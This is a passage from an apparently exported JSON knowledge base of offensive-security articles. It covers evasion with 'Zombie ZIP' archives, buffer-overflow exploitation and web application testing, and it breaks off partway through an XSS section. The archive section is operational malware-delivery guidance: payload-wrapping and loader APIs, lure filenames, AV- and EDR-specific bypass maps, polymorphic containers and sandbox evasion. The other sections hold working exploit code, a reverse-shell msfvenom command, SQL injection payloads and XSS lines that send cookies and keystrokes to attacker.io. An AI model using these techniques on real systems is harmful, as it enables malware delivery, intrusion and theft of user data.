▼ TARGET VARIABLES LIVE
← Select an article
\n```\n\n### ISO Container (dual evasion)\nWrap Zombie ZIP inside ISO — files extracted from ISO on Windows skip Mark-of-the-Web:\n```bash\nmkisofs -o payload.iso payload.zip\n```\n\n## Vantablack API\n\n```bash\n# Wrap payload in Zombie ZIP\ncurl -X POST /api/zombie-zip/wrap -H \"X-API-Token: $T\" \\\n -d '{\"payload_b64\":\"BASE64\",\"filename\":\"update.bin\",\"validate\":true}'\n\n# Generate loader stub\ncurl -X POST /api/zombie-zip/loader -H \"X-API-Token: $T\" \\\n -d '{\"language\":\"powershell\",\"container_b64\":\"CONTAINER\"}'\n\n# Unwrap for testing\ncurl -X POST /api/zombie-zip/unwrap -H \"X-API-Token: $T\" \\\n -d '{\"container_b64\":\"CONTAINER\"}'\n```\n\nThe `validate` flag performs a decompression round-trip before returning the container.\n\n## Detection and YARA\n\n```yara\nrule ZombieZIP_FormatConfusion {\n meta: description = \"ZIP declaring STORED with high-entropy data\"\n strings:\n $lfh = { 50 4B 03 04 }\n $cdh = { 50 4B 01 02 }\n condition:\n $lfh at 0 and $cdh and\n uint16(@lfh + 8) == 0 and // method=STORED\n filesize < 52428800\n // Add entropy check on data at offset 30+ for deployed rules\n}\n```\n\n**SIEM detection:** Archive extraction events where declared method=0 but decompression tool succeeds (7-Zip strict mode raises error on these files, creating a detectable event).\n\n## OpSec Notes\n\n- Rotate XOR key between operations — breaks hash-based IOCs on container\n- Use different internal filenames per campaign (not `payload.bin`)\n- Convincing delivery names: `invoice_Q4_2026.zip`, `vpn-client-update.zip`\n- Combine with ISO for dual bypass (MOTW + format confusion)\n- Obfuscate loader stubs — raw Python/PS loader strings are signatured\n- Test against target EDR version before deployment (use sysinfo module to identify AV engine)\n\n## ◈ ADVANCED\n\n### Multi-Layer Format Nesting for Deeper Evasion\n\nChain multiple format confusion layers:\n\n```\nLayer 1: Zombie ZIP (method=STORED, data=raw DEFLATE)\nLayer 2: Inside the ZIP: a \"PNG\" file (PNG header bytes) with payload appended after IEND chunk\nLayer 3: Payload itself: XOR-encrypted with environment-derived key\nLayer 4: Container delivered via HTML smuggling inside a document\n\nAV path:\n1. Extracts \"empty\" ZIP (method=STORED scan, no suspicious content)\n2. Finds \"PNG image\" — scans as image file, no code signatures\n3. Never reaches the payload layer\n\nLoader path:\n1. Load-Zombie extracts raw DEFLATE content\n2. Parse PNG, find custom chunk after IEND, extract payload\n3. Derive key from hostname/username, XOR-decrypt\n4. Execute\n```\n\n### Adaptive Format Selection Based on Target EDR\n\nBuild format confusion containers tailored to the detected AV engine:\n\n```python\nEDR_BYPASS_MAP = {\n \"Defender\": \"zombie_zip\", # method confusion sufficient\n \"ESET\": \"zombie_zip_plus_png\", # needs image wrapper\n \"Kaspersky\": \"lzma_lie\", # declare method=14 (LZMA), use DEFLATE\n \"Bitdefender\": \"bzip2_lie\", # declare method=12 (BZIP2), use DEFLATE\n \"CrowdStrike\": \"zombie_zip_xor\", # ZIP + XOR layer + polymorphic stub\n}\n```\n\nThe Vantablack server's `zombie-zip/wrap` endpoint accepts `target_av` parameter for automatic format selection.\n\n### Polymorphic ZIP Container Generation\n\nEach delivery generates a structurally unique container:\n\n```python\nPer-delivery variations:\n1. Internal filename: random 8-16 char string with .bin/.dat/.tmp extension\n2. Extra field: random 0-12 bytes of padding in local file header\n3. Fake timestamps: random date within past 2 years\n4. CRC field: correct value but computed before XOR obfuscation layer\n5. EOCD comment: random 0-4 byte comment appended\n6. Second dummy file entry: random benign data as first entry (real payload second)\n\nResult: no two containers share a hash or structure\nYARA rule must match format semantics, not bytes — harder to write reliably\n```\n\n### ZIP Archive Bomb via Format Confusion\n\nCombine Zombie ZIP with zip bomb characteristics for sandbox evasion:\n\n```\n1. Build a container that declares uncompressed size = 10GB\n2. Actual decompressed content = 1MB real payload\n3. AV sandbox with memory limits aborts decompression after detecting \"bomb\"\n4. Real loader reads only first 1MB, gets full payload\n\nMany sandbox engines abort on size-declaration triggers before reaching payload\nThis provides \"sandbox detection via resource exhaustion\" without active checks\n```", "last_updated": "2026-03-18"}, "buffer-overflows": {"slug": "buffer-overflows", "title": "Buffer Overflows", "category": "Exploit Development", "content": "# Buffer Overflows\n\n## ◈ BEGINNER\n\n### What Is a Buffer Overflow?\n\nPrograms allocate fixed-size chunks of memory called **buffers** to hold input data. A buffer overflow occurs when a program writes more data into a buffer than it was designed to hold. The extra bytes spill past the buffer's boundary and overwrite adjacent memory — including critical control data like the **return address**, which tells the CPU where to continue executing after the current function finishes.\n\nIf an attacker can control what overwrites the return address, they control where the program jumps next. Point it at attacker-supplied code (shellcode) or chain together existing code snippets (ROP), and you have arbitrary code execution — typically a shell.\n\n**Why it matters:** Buffer overflows have historically been the single most impactful class of software vulnerability. Worms like Code Red and Slammer, the Morris Worm, and countless privilege escalation exploits all relied on buffer overflows. Modern systems add layers of mitigation (ASLR, NX, canaries, CFI), but understanding each mitigation and its bypass is essential for vulnerability research, CTF competitions, and exploit development.\n\n**Analogy:** Imagine a glass sitting on a control panel full of buttons. The glass is your buffer. If you pour too much water, it overflows onto the panel — and the spilled water presses buttons you were never supposed to touch. In memory terms, the \"buttons\" are the return address and other control data on the stack.\n\n### Key Terms\n\n- **Stack** — region of memory used for function call frames; grows downward on x86; local variables, saved registers, and return addresses live here\n- **Return address (EIP/RIP)** — address saved on the stack telling the CPU where to go after the current function returns; the attacker's primary target\n- **Buffer** — fixed-size chunk of memory allocated for input (e.g., `char buf[64]`)\n- **Stack overflow** — writing past the end of a stack buffer into adjacent memory, overwriting the return address and potentially other saved values\n- **Heap overflow** — writing past the end of a dynamically allocated (heap) buffer; exploitation follows a different path involving allocator metadata corruption\n- **NX/DEP** — Non-Executable stack / Data Execution Prevention; marks the stack (and other data regions) as non-executable so injected shellcode there will not run\n- **ASLR** — Address Space Layout Randomization; randomizes the base addresses of the stack, heap, and shared libraries on each execution, making hardcoded addresses unreliable\n- **Stack canary** — a random value placed on the stack between local variables and the saved return address; checked when the function returns; an overflow must either preserve, leak, or bypass it\n- **ROP (Return-Oriented Programming)** — technique that chains short sequences of existing instructions (gadgets), each ending in `ret`, to build arbitrary computation without injecting any new code; the primary bypass for NX/DEP\n- **pwntools** — Python library for writing exploits; provides packing helpers, connection abstractions, ROP chain builders, and shellcode generation\n- **checksec** — tool that reports which protections (NX, canary, PIE, RELRO) a binary has enabled\n- **msfvenom** — Metasploit tool for generating shellcode in various formats for different architectures and operating systems\n- **JMP ESP** — an instruction used as a trampoline in classic stack overflows; set EIP to a `JMP ESP` gadget, and execution falls into shellcode placed immediately after the return address on the stack\n\n### First Steps for Practice\n\n1. Compile a vulnerable C program with all protections disabled: `gcc -m32 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln`\n2. Find the offset to EIP using a cyclic pattern (`cyclic` in pwntools or `pattern_create.rb`)\n3. Confirm EIP control by overwriting with a known value like `0x42424242`\n4. Add shellcode with a NOP sled and redirect EIP via a `JMP ESP` gadget\n5. Progressively re-enable protections (canary, NX, ASLR, PIE) and learn each bypass technique\n\n### Safe Practice Environments\n\n- **pwn.college** — structured, progressive binary exploitation curriculum\n- **exploit.education** (formerly Protostar/Phoenix) — classic stack/heap/format string challenges\n- **HackTheBox** — pwn challenges ranging from beginner to expert\n- **CTFtime** — directory of live CTF competitions with pwn categories\n\n---\n\n## ◈ INTERMEDIATE\n\nBuffer overflows remain a foundational exploitation technique. Understanding them is essential for CTFs, vulnerability research, and understanding modern mitigations.\n\n## Memory Layout\n\n```\nHigh addresses\n┌────────────────────┐\n│ Stack │ ← grows downward\n│ (local vars, │\n│ return addrs, │\n│ saved regs) │\n├────────────────────┤\n│ Heap │ ← grows upward (dynamic allocations)\n├────────────────────┤\n│ BSS │ uninitalized global/static vars\n├────────────────────┤\n│ Data │ initialized global/static vars\n├────────────────────┤\n│ Text │ program code (read-only)\n└────────────────────┘\nLow addresses\n\nStack frame for function f():\n┌────────────────────┐ ← high\n│ caller args │\n├────────────────────┤\n│ return address │ ← EIP/RIP we want to control\n├────────────────────┤\n│ saved EBP/RBP │\n├────────────────────┤\n│ local variables │ ← buffer lives here\n└────────────────────┘ ← ESP/RSP (stack pointer)\n```\n\n---\n\n## Classic Stack Overflow (32-bit)\n\nVulnerable code:\n```c\n#include \n#include \nvoid vuln(char *input) {\n char buf[64];\n strcpy(buf, input); // no bounds check!\n}\nint main(int argc, char **argv) {\n vuln(argv[1]);\n return 0;\n}\n// Compile: gcc -m32 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln\n```\n\n### Step 1: Find Offset to EIP\n\n```bash\n# Generate cyclic pattern (Metasploit)\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200\n# Aa0Aa1Aa2Aa3Aa4...\n\n# Run in debugger (gdb with pwndbg or peda)\ngdb ./vuln\nrun $(python3 -c \"print('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3')\")\n# SIGSEGV — read EIP value: 0x37654136\n\n# Find offset\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37654136\n# [*] Exact match at offset 76\n```\n\n### Step 2: Control EIP\n\n```python\npython3 -c \"print('A'*76 + 'BBBB')\" | ./vuln\n# EIP = 0x42424242 (BBBB) — confirmed control\n```\n\n### Step 3: Find Bad Characters\n\n```python\n# Generate all byte values\nbadchars = bytes(range(1, 256)) # exclude \\x00 (null terminator)\npayload = b\"A\" * 76 + b\"B\" * 4 + badchars\n```\n\n```bash\n# In gdb: examine stack after crash, compare against expected sequence\n# Missing or modified bytes = bad chars\n# Common bad chars: \\x00 (null), \\x0a (newline), \\x0d (carriage return), \\xff\n```\n\n### Step 4: Find JMP ESP (No ASLR)\n\n```bash\n# Find JMP ESP instruction in binary or loaded DLLs (must not have ASLR)\nobjdump -d /lib/i386-linux-gnu/libc.so.6 | grep \"jmp.*esp\" | head\n# Or with pwndbg:\npwndbg> jmpcall esp\n# Or with msfpescan:\nmsfpescan -j esp vuln\n\n# Note the address: e.g., 0x0804858b\n```\n\n### Step 5: Shellcode + Exploit\n\n```python\nfrom pwn import *\n\n# msfvenom shellcode (no bad chars)\n# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 \\\n# -b \"\\x00\\x0a\\x0d\" -f python\n\nshellcode = b\"\\xdb\\xc0\\xd9\\x74\\x24\\xf4...\" # paste msfvenom output\n\noffset = 76\njmp_esp = p32(0x0804858b) # JMP ESP address (little-endian)\nnop_sled = b\"\\x90\" * 16 # NOP sled before shellcode\n\npayload = b\"A\" * offset + jmp_esp + nop_sled + shellcode\n\np = process(\"./vuln\")\np.sendline(payload)\np.interactive()\n```\n\n---\n\n## Protection Bypasses\n\n### Stack Canaries\n\nCanaries are random values placed before the return address — checked on function return:\n\n```bash\nchecksec ./vuln # check: Canary: Yes/No\n\n# Bypass 1: leak canary (format string, info leak)\n# Bypass 2: brute force (forking servers — canary same across fork())\n# Bypass 3: overwrite __stack_chk_fail GOT entry\n# Bypass 4: bypass via heap/BSS overflow (doesn't touch stack canary)\n```\n\n### NX/DEP (Non-Executable Stack)\n\nStack marked non-executable — shellcode on stack won't run:\n\n```bash\nchecksec ./vuln # NX: enabled\n\n# Bypass: ret2libc — return into libc functions instead of shellcode\n# System(\"/bin/sh\") call:\n# EIP → system(), fake return addr, &\"/bin/sh\"\n\nfrom pwn import *\nelf = ELF('./vuln')\nlibc = ELF('/lib/i386-linux-gnu/libc.so.6')\nsystem_addr = libc.symbols['system']\nbinsh_addr = next(libc.search(b'/bin/sh'))\nexit_addr = libc.symbols['exit']\n\npayload = b\"A\" * offset\npayload += p32(system_addr)\npayload += p32(exit_addr) # return address after system()\npayload += p32(binsh_addr) # argument to system()\n```\n\n### ASLR\n\nASLR randomizes base addresses of stack, heap, and libraries:\n\n```bash\ncat /proc/sys/kernel/randomize_va_space # 2 = full ASLR, 0 = disabled\n\n# Bypass 1: information leak — find base address, calculate offset\n# Bypass 2: brute force 32-bit (1/256 chance per attempt for stack ASLR)\n# Bypass 3: ret2plt — GOT/PLT addresses not randomized with PIE disabled\n# Bypass 4: heap spray — spray large area, increase landing probability\n```\n\n---\n\n## ROP Chains (Return-Oriented Programming)\n\nChain existing code snippets (\"gadgets\") ending in `ret` to execute arbitrary logic without injecting code:\n\n```bash\n# Find gadgets\nROPgadget --binary vuln --rop\nropper -f vuln\n# Look for: pop eax; ret, pop ebx; ret, int 0x80, syscall, etc.\n\n# pwntools ROP automation\nfrom pwn import *\nelf = ELF('./vuln')\nrop = ROP(elf)\nrop.call('system', [next(elf.search(b'/bin/sh\\x00'))])\nprint(rop.dump())\n\npayload = b\"A\" * offset + rop.chain()\n```\n\n### 64-bit ROP (Linux execve syscall)\n\n```python\n# syscall number: 59 (execve), args in rdi, rsi, rdx\n# execve(\"/bin/sh\", NULL, NULL)\nfrom pwn import *\nelf = ELF('./vuln64')\nrop = ROP(elf)\n\npop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]\npop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0] # common combo\npop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]\nsyscall = rop.find_gadget(['syscall'])[0]\npop_rax = rop.find_gadget(['pop rax', 'ret'])[0]\nbinsh = next(elf.search(b'/bin/sh\\x00'))\n\nchain = flat([\n pop_rax, 59, # execve\n pop_rdi, binsh, # filename\n pop_rsi, 0, 0, # argv = NULL (rsi + r15 gadget)\n pop_rdx, 0, # envp = NULL\n syscall\n])\npayload = b\"A\" * offset + chain\n```\n\n---\n\n## Heap Exploitation (Overview)\n\n### Use-After-Free (UAF)\n\n```c\n// Allocate, free, access (dangling pointer)\nchar *ptr = malloc(64);\nfree(ptr);\n// ptr still points to freed memory — if reallocated with attacker data:\n// ptr->function_pointer() → attacker control\n```\n\n### Double Free\n\n```c\nfree(ptr);\n// ... later ...\nfree(ptr); // undefined behavior → heap corruption → potential control\n```\n\n### Heap Spray\n\nFill heap with shellcode + NOP sled to increase hit probability for exploits with imprecise control:\n\n```javascript\n// Browser heap spray (JavaScript)\nvar shellcode = unescape(\"%u9090%u9090...\"); // NOP sled + shellcode\nvar spray = unescape(\"%u9090%u9090\");\nwhile (spray.length < 0x40000) spray += spray;\nvar chunks = [];\nfor (var i = 0; i < 1000; i++) {\n chunks[i] = spray.substr(0, 0x40000 - 32 / 2) + shellcode;\n}\n// Force allocation at predictable address (0x0c0c0c0c)\n```\n\n---\n\n## Tools Reference\n\n| Tool | Purpose |\n|------|---------|\n| pwndbg | GDB plugin — heap visualization, ROP, pattern |\n| pwntools | Python exploit framework — packing, ROP, shellcraft |\n| ROPgadget | Find ROP gadgets in binary |\n| ropper | Gadget finder + ROP chain builder |\n| checksec | Check binary protections |\n| msfvenom | Shellcode generation |\n| one_gadget | Find one-shot shell gadgets in libc |\n| ghidra / IDA | Disassembly / decompilation |\n| angr | Symbolic execution — find paths to vulnerability |\n\n```bash\n# Common pwntools snippets\nfrom pwn import *\ncontext.arch = 'i386' # or 'amd64'\ncontext.os = 'linux'\n\np = process('./vuln') # local\np = remote('target.com', 1337) # remote\np.sendline(payload)\np.recvuntil(b'> ')\np.interactive()\n\n# Shellcode generation\nshellcode = asm(shellcraft.sh())\nshellcode = asm(shellcraft.linux.x86.sh())\nprint(enhex(shellcode))\n```\n\n---\n\n## ◈ ADVANCED\n\n### Modern Exploit Development (2026)\n\n#### Heap Exploitation Deep Dive\n\nThe glibc heap allocator (ptmalloc2) organizes freed chunks into bins that determine allocation strategy:\n\n- **Tcache bins** (per-thread cache, glibc 2.26+): each thread has 64 singly-linked bins for sizes 24-1032 bytes, holding up to 7 chunks each. Fastest allocation path — minimal metadata checks in older versions.\n- **Fastbins**: singly-linked LIFO bins for small chunks (up to 176 bytes on 64-bit). No coalescing with neighbors.\n- **Small bins**: doubly-linked, exact-size bins for chunks up to 1024 bytes. FIFO ordering.\n- **Large bins**: doubly-linked, sorted by size for chunks above 1024 bytes.\n- **Unsorted bin**: single doubly-linked list where all freed chunks land initially before being sorted into small/large bins.\n\nChunk metadata layout: `prev_size | size (+ flags A|M|P)` header, then `fd | bk` pointers when freed. Corrupting `fd` (forward pointer) in a tcache or fastbin lets you redirect the next `malloc()` return to an arbitrary address.\n\n**Tcache poisoning (glibc 2.26+):** Free a chunk to place it in the tcache. Corrupt its `fd` pointer (via UAF, heap overflow, or double free) to point to a target address. The next two `malloc()` calls of that size return: (1) the original chunk, (2) the target address — giving you an arbitrary write primitive. Glibc 2.34+ added `PROTECT_PTR` (safe-linking) which XORs `fd` with a heap address, requiring a heap leak to bypass.\n\n**House techniques** — classes of heap shaping attacks, each exploiting different allocator behaviors:\n- **House of Force**: corrupt the wilderness (top chunk) size to a huge value, then request a precisely calculated allocation size to make the next `malloc()` return any address. Requires ability to overwrite top chunk size and control allocation size.\n- **House of Orange**: trigger top chunk extension by requesting a size larger than current top chunk (but smaller than mmap threshold), causing `sysmalloc` to free the old top chunk. Combine with FSOP for code execution without calling `free()`.\n- **House of Einherjar**: corrupt `prev_size` of a chunk and clear its `PREV_INUSE` flag, causing backward coalescing with a fake chunk at an attacker-controlled address during `free()`.\n\n**FSOP (File Stream Oriented Programming):** Glibc FILE structures (stdout, stderr, etc.) contain function pointer tables (vtables). By corrupting a FILE structure's vtable pointer to point at a fake vtable, you gain code execution when any file operation (fclose, fflush, printf) triggers a vtable call. Glibc 2.24+ added vtable validation restricting the pointer to the `__libc_IO_vtables` section — bypassed via `_IO_str_overflow` or `_IO_wstr_overflow` which still allow redirecting execution through controlled fields.\n\n#### Kernel Exploitation Overview\n\nKernel exploits target a different execution context — the goal is `commit_creds(prepare_kernel_cred(0))`, which gives the current process a root credential structure.\n\nCommon kernel bug classes:\n- **NULL pointer dereference** (with `mmap_min_addr = 0`): map page 0, place shellcode/fake struct, trigger NULL deref in kernel\n- **Use-after-free in kernel objects**: race condition or logic bug frees a kernel object while a reference remains; replace the freed object with controlled data via heap spray (e.g., `msgsnd`, `sendmsg`, `keyctl`)\n- **Race conditions in syscalls**: TOCTOU between access check and resource use; exploit with `userfaultfd` or `FUSE` to pause kernel execution mid-operation\n- **Type confusion**: kernel treats one object type as another, misinterpreting fields as function pointers\n\nHardware mitigations: **SMEP** (Supervisor Mode Execution Prevention) prevents the kernel from executing userspace pages — ROP/JOP within kernel code is required. **SMAP** (Supervisor Mode Access Prevention) prevents the kernel from reading userspace pages — cannot use userspace fake structures directly; must place them in kernel memory. **KASLR** randomizes the kernel base address; bypass via `/proc/kallsyms` (if readable), prefetch timing side-channels, or kernel heap spray with known offsets.\n\n#### Browser Exploitation (2026)\n\nModern browser exploitation targets JIT compiler bugs in V8 (Chrome) or SpiderMonkey (Firefox):\n- **Type confusion**: JIT compiler incorrectly speculates a variable's type, generating code that accesses memory with wrong size/layout — yields OOB read/write\n- **JIT spraying**: obsolete on modern engines due to constant blinding and W^X JIT pages\n- **V8 sandbox (cage)**: V8 now isolates its heap in a 4GB virtual cage; pointers within the cage are compressed to 32-bit; escaping the cage requires corrupting external (non-V8) pointers or exploiting Blink/browser-process objects\n\nTypical modern chain: renderer RCE (V8 type confusion) then sandbox escape (Mojo IPC bug or GPU process exploit) then OS privilege escalation (kernel bug or misconfig).\n\n#### Mitigation Bypass Matrix (2026)\n\n- **CFI (Control Flow Integrity)**: restricts indirect call/jump targets to valid function signatures. Bypass via type confusion to find a valid call target with attacker-favorable side effects, or use data-only attacks (modify non-pointer data to change program logic without hijacking control flow).\n- **CET (Control-flow Enforcement Technology)**: Intel hardware feature with shadow stack (protects return addresses) and indirect branch tracking (IBT). Shadow stack bypass requires corrupting the shadow stack itself (ring-0 only) or using forward-edge attacks. IBT requires `ENDBR64` at indirect call targets — limits but does not eliminate JOP.\n- **PIE + full ASLR**: all code sections randomized; exploitation requires an information leak first. Common leak primitives: format string bugs, out-of-bounds reads, UAF leaking heap/libc pointers, partial overwrites (overwrite low bytes of a pointer, brute force 4 bits of ASLR entropy).\n\n#### Exploit Reliability Engineering\n\n- **Heap grooming**: carefully sequence allocations and frees to place target objects at predictable offsets relative to attacker-controlled data. Requires understanding the allocator's binning and coalescing behavior.\n- **Deterministic vs spray**: deterministic exploits model allocator state precisely and work on the first attempt. Spray approaches (allocate thousands of objects hoping one lands at the right offset) work when you have many attempts or the target restarts.\n- **Remote exploitation**: must be reliable across different library versions. Build a leak into the exploit flow to resolve libc base dynamically. Use relative offsets between symbols rather than absolute addresses. LibcSearcher and libc-database help identify remote libc versions from leaked pointers.\n\n#### CTF vs Real-World Gap\n\nCTF binaries typically have artificial constraints (single vulnerability, limited seccomp sandbox, known libc version). Real-world targets have seccomp-bpf filters blocking dangerous syscalls (requiring ORW — open/read/write chains instead of `execve`), full ASLR+PIE+RELRO, hardened allocators (glibc safe-linking, jemalloc, PartitionAlloc), and crash recovery that limits retry-based approaches.\n\n#### Tools in 2026\n\n- **GEF/pwndbg**: GDB extensions with heap visualization (`vis_heap_chunks`, `bins`), automatic ROP gadget search, and de Bruijn pattern support\n- **pwntools**: Python exploit framework with `ROP()`, `shellcraft`, `DynELF` for remote symbol resolution, and `tubes` for connection management\n- **LibcSearcher + libc-database**: identify remote libc version from leaked function addresses; retrieve offsets for `system`, `/bin/sh`, one_gadgets\n- **one_gadget**: find single-gadget RCE in libc (constraints on register/stack state)\n- **pwninit**: automatically patch challenge binaries to use a specific glibc + ld.so for local testing\n- **angr**: symbolic execution engine for automated vulnerability discovery and constraint solving", "last_updated": "2026-03-18"}, "web-app-testing": {"slug": "web-app-testing", "title": "Web Application Testing", "category": "Exploit Development", "content": "# Web Application Testing\n\n## ◈ BEGINNER\n\n### What Is Web Application Penetration Testing?\n\nWeb applications are software delivered over HTTP/HTTPS — browsers send requests carrying user input (form fields, URL parameters, cookies, JSON bodies), and servers process that input against backend logic and databases. Penetration testing systematically checks whether that input handling can be manipulated by an attacker.\n\n**Why it matters:** Web apps are the most exposed attack surface in modern organizations. A single vulnerability can expose millions of user records, enable account takeover across an entire user base, or provide an initial foothold into internal infrastructure. The OWASP Top 10 catalogs the most critical classes of web vulnerabilities.\n\n**Analogy:** Think of a building inspector testing every door, window, utility connection, and service entrance for weaknesses — not trying to break in randomly, but systematically verifying each entry point against a checklist of known failure modes.\n\n### Key Terms\n\n- **HTTP request/response** — the client sends a request (method, URL, headers, optional body); the server returns a response (status code, headers, body); every piece of data the server receives is a potential injection point\n- **Parameter** — a named value passed to the server in the URL query string, POST body, cookie, or HTTP header; parameters are the primary attack surface for injection vulnerabilities\n- **Burp Suite** — an intercepting proxy and web testing platform that sits between your browser and the target server, capturing and allowing modification of every request and response\n- **SQLi (SQL Injection)** — injecting SQL syntax into parameters to manipulate the server's database query, potentially extracting data, bypassing authentication, or executing OS commands\n- **XSS (Cross-Site Scripting)** — injecting JavaScript that executes in other users' browsers, enabling session hijacking, credential phishing, and keylogging\n- **SSRF (Server-Side Request Forgery)** — manipulating the server into making HTTP requests to attacker-specified URLs, reaching internal services, cloud metadata endpoints, or performing port scans behind the firewall\n- **XXE (XML External Entity)** — injecting XML entity declarations into XML input to read local files or trigger SSRF via the XML parser\n- **SSTI (Server-Side Template Injection)** — injecting template syntax ({{7*7}}, ${7*7}) into user-controlled values that the server-side template engine evaluates, often leading to remote code execution\n- **IDOR / BOLA** — Insecure Direct Object Reference / Broken Object Level Authorization; accessing another user's resources by changing an ID value in a request\n- **JWT (JSON Web Token)** — compact, signed authentication token; vulnerable to algorithm confusion attacks (alg:none, RS256→HS256) and weak secret brute force\n- **Fuzzing** — sending many different inputs (from a wordlist or mutation engine) to discover unexpected error responses, new endpoints, or injection opportunities\n- **nuclei** — fast open-source vulnerability scanner using community-written YAML templates for thousands of CVEs and misconfigurations\n- **ffuf** — fast web fuzzer for directory/file discovery and parameter enumeration\n- **Burp Intruder / Turbo Intruder** — Burp tools for automated request fuzzing; Turbo Intruder supports HTTP/2 single-packet attacks for race condition testing\n\n### First Steps\n\n1. Configure your browser to proxy through Burp Suite (127.0.0.1:8080) and install the Burp CA certificate\n2. Browse the entire application normally — Burp logs every request, building your attack surface map\n3. Identify all parameters (query string, POST body, JSON fields, cookies, custom headers)\n4. Test each injection type manually in Repeater before reaching for automation\n5. Use nuclei for a broad first pass to catch known vulnerabilities quickly\n\n### Practice Environments\n\n- **PortSwigger Web Security Academy** — free, structured labs for every OWASP category\n- **DVWA (Damn Vulnerable Web App)** — self-hosted, adjustable difficulty\n- **OWASP Juice Shop** — modern, realistic vulnerable app with gamified challenges\n- **HackTheBox** — web machines and web challenges ranging from beginner to expert\n\n---\n\n## ◈ INTERMEDIATE\n\nWeb application penetration testing covers a broad attack surface — from authentication bypasses to injection flaws, API vulnerabilities, and modern framework weaknesses.\n\n### Methodology\n\n```\n1. Reconnaissance — subdomains, tech stack, endpoints\n2. Mapping — sitemap, parameters, authentication flows\n3. Authentication — login bypass, session management, MFA\n4. Authorization — IDOR, privilege escalation, BOLA/BFLA\n5. Injection — SQLi, XSS, SSTI, XXE, command injection\n6. Business Logic — workflow bypasses, race conditions\n7. APIs — REST, GraphQL, SOAP, gRPC\n8. Infrastructure — server misconfigs, exposed services\n```\n\n---\n\n### Reconnaissance\n\n```bash\n# Subdomain enumeration\nsubfinder -d target.com -all -o subs.txt\namass enum -passive -d target.com -o amass.txt\ncat subs.txt amass.txt | sort -u | httprobe > alive.txt\n\n# Technology fingerprinting\nwhatweb https://target.com\nwappalyzer (browser extension)\ncurl -I https://target.com | grep -i \"server\\|x-powered\\|x-generator\"\n\n# Directory and file brute force\nffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ -mc 200,301,302,403\nferoxbuster -u https://target.com -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt\n\n# Parameter discovery\narjun -u https://target.com/api/endpoint --get --post\nffuf -w params.txt -u \"https://target.com/search?FUZZ=test\"\n\n# JavaScript analysis (hidden endpoints, API keys)\ngau target.com | grep \"\\.js$\" | sort -u # all JS files\ncat *.js | grep -E \"api_key|apiKey|secret|token|password|Bearer\"\nlinkfinder -i https://target.com -d # extract endpoints from JS\n```\n\n---\n\n### Burp Suite Workflow\n\n```\n1. Scope: Target → Scope → Add target domain(s)\n2. Proxy: browse application — Burp intercepts all traffic\n3. Crawl: Spider/Crawl to map application automatically\n4. Scan: Active scan (Pro) or manual testing\n5. Repeater: Test individual requests\n6. Intruder: Fuzzing, brute force\n7. Decoder: Encode/decode base64, URL, hex, etc.\n8. Comparer: Diff two responses\n```\n\n```bash\n# Useful Burp extensions:\n# - Active Scan++: additional active scan checks\n# - AuthMatrix: test authorization across user roles\n# - JSON Web Tokens: JWT analysis and attacks\n# - Param Miner: discover hidden parameters\n# - Turbo Intruder: high-speed Intruder replacement\n# - Retire.js: detect vulnerable JS libraries\n# - Reflected Parameters: find reflection points for XSS\n```\n\n---\n\n### SQL Injection\n\n#### Detection\n\n```bash\n# Manual: add ' or \" to parameter, look for database error\nhttps://target.com/item?id=1'\n# Error: \"You have an error in your SQL syntax...\" → MySQL confirmed\n\n# Boolean-based detection\nid=1 AND 1=1 → normal response\nid=1 AND 1=2 → different response (blind SQLi)\n\n# Time-based detection\nid=1; SLEEP(5)-- MySQL\nid=1; WAITFOR DELAY '0:0:5'-- MSSQL\nid=1; pg_sleep(5)-- PostgreSQL\n```\n\n#### sqlmap\n\n```bash\n# Basic scan\nsqlmap -u \"https://target.com/item?id=1\" --dbs\n\n# POST request\nsqlmap -u \"https://target.com/login\" --data=\"user=admin&pass=test\" -p user\n\n# With session cookie\nsqlmap -u \"https://target.com/profile?id=1\" --cookie=\"session=abc123\" --dbs\n\n# Dump specific database/table\nsqlmap -u \"https://target.com/item?id=1\" -D targetdb -T users --dump\n\n# Bypass WAF\nsqlmap -u \"...\" --tamper=space2comment,randomcase,charunicodeescape\n\n# OS command execution (if privileged)\nsqlmap -u \"...\" --os-shell # interactive OS shell via SQLi\n\n# From Burp request file\nsqlmap -r request.txt --level=5 --risk=3\n```\n\n#### Manual Exploitation (MySQL)\n\n```sql\n-- UNION-based\nid=1 UNION SELECT NULL,NULL,NULL-- -- find column count\nid=1 UNION SELECT user(),version(),NULL-- -- fingerprint\nid=1 UNION SELECT username,password,NULL FROM users--\n\n-- Error-based\nid=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--\n\n-- Blind (boolean)\nid=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--\n\n-- Time-based blind\nid=1 AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--\n\n-- Stacked queries (MSSQL)\nid=1; INSERT INTO users VALUES ('hacker','hash')--\n```\n\n---\n\n### Cross-Site Scripting (XSS)\n\n#### Detection\n\n```html\n\n\n\">\n'>\njavascript:alert(1)\n\" onmouseover=\"alert(1)\n\n\n\n```\n\n#### Exploits\n\n```javascript\n// Session hijacking\nfetch(\"https://attacker.io/steal?c=\"+document.cookie)\n\n// Keylogger\ndocument.addEventListener('keypress', e => {\n fetch('https://attacker.io/k?k=' + e.key)\n})\n\n// Phishing via XSS (inject login form)\ndocument.body.innerHTML = '
